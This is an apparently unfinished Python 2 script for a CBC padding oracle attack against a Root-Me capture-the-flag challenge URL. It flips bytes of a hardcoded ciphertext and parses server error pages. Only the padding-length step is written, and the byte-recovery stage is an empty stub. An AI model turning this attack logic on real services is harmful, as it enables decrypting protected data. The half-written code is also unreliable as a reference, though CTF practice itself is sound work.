# encoding: utf-8
import logging
from enum import Enum

from leak.base import RegexParser
from leak.leak import HTTPLeaker


#logging.basicConfig()


class RedPillsParser(RegexParser):
    def __init__(self):
        print u'ééé'
        super(RedPillsParser, self).__init__(pattern=r'.*((?P<success><h2>Home</h2>)|(?P<file><h2>File not found</h2>)|(?P<padding_error><h2>Server Error: Padding Error</h2>).*)')


class CBCPaddingOracle(HTTPLeaker):
    class State(Enum):
        ORIGINAL_PADDING_FINDING = 0
        BYTE_RETRIEVAL           = 1

    def __init__(self, **kwargs):
        print '????'
        super(CBCPaddingOracle, self).__init__(parser=RedPillsParser(), **kwargs)

        self.state.update({
            'state': self.State.ORIGINAL_PADDING_FINDING,
            'idx': 0,
        })

    def update(self):
        state = self.state['state']

        padding_error = self._leak['padding_error']
        success       = self._leak['success']
        file          = self._leak['file']

        if state == self.State.ORIGINAL_PADDING_FINDING:
            # we are starting from the leftest byte and increasing the index
            # until we obtain a padding error
            if file:
                self.state['idx'] += 1
            elif padding_error:
                self.logger.info('find padding of %d bytes' % self.state['idx'])
                raise

        elif state == self.State.BYTE_RETRIEVAL:
            pass

    def get_requests_method(self):
        return 'GET'

    def get_requests_data(self):
        return {}

    def has_finished(self):
        print '@@@@'
        return False

    def get_requests_params(self):

        ciphertext = 'E5D68870EB5626D54D4F12F2A5EA2F80550CF3C11CF45ED978C5CD8155724490'

        if self.state['state'] == self.State.ORIGINAL_PADDING_FINDING:
            idx = self.state['idx']*2
            ciphertext= ciphertext[:idx] + '00' + ciphertext[idx + 2:]

        return {
            'c': ciphertext,
        }

    def get_requests_url(self):
        return 'http://challenge01.root-me.org/realiste/ch12/index.aspx'


if __name__ == '__main__':
    leaker = CBCPaddingOracle()

    print leaker()